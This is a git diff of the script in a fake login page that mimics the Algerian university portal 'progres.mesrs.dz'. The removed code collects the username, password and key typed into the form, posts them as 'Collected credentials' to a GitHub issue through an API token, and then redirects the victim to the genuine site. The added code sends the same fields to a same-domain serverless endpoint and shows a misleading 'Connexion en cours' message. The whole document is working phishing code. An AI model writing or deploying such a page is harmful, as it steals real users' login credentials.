@@ -235,82 +235,36 @@ padding-left: 4px;
     </div>
 
     <script>
-        
-        const GITHUB_OWNER = "ZA3MA3"; 
-        const GITHUB_REPO = "progres"; 
-       const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
-
-        
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); 
-            
-           
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const key = document.getElementById('key').value;
-            
-           
-            const issueTitle = "Login Attempt";
-            const issueBody = `Collected credentials:\n\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`;
-            
-            createGitHubIssue(GITHUB_OWNER, GITHUB_REPO, issueTitle, issueBody, ["login-attempt"], GITHUB_TOKEN)
-                .then(data => {
-                    showResult(`Login attempt recorded successfully!`, true);
-                    console.log('Issue created:', data);
-                    
-                  
-                    
-                         window.location.href = "https://progres.mesrs.dz/webfve/login.xhtml";
-                    
-                })
-                .catch(error => {
-                  
-                    showResult(`Connexion en cours... Veuillez patienter.`, true);
-                    console.error('Failed to create issue:', error);
-                });
-        });
-        
-        async function createGitHubIssue(owner, repo, title, body, labels, token) {
-            const url = `https://api.github.com/repos/${owner}/${repo}/issues`;
-            
-            const headers = {
-                'Authorization': `Bearer ${token}`,
-                'Accept': 'application/vnd.github.v3+json',
-                'Content-Type': 'application/json'
-            };
-            
-            const data = {
-                title: title,
-                body: body,
-                labels: labels
-            };
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: headers,
-                body: JSON.stringify(data)
-            });
-            
-            const responseData = await response.json();
-            
-            if (!response.ok) {
-                throw new Error(`GitHub API error: ${response.status} ${JSON.stringify(responseData)}`);
-            }
-            
-            return responseData;
-        }
-        
-        function showResult(message, isSuccess) {
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = message;
-            resultDiv.style.display = 'block';
-            
-            if (isSuccess) {
-                resultDiv.className = 'success';
-            } else {
-                resultDiv.className = 'error';
-            }
-        }
+      // Inside your submit event listener
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+  event.preventDefault();
+  
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const key = document.getElementById('key').value;
+  
+  // Call your Vercel serverless function on the same domain
+  fetch('/api/create-issue', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      username,
+      password,
+      key
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Success:', data);
+    showResult('Login attempt recorded successfully!', true);
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    showResult('Connexion en cours...', true);
+  });
+});
     </script>
 </body>
 </html>
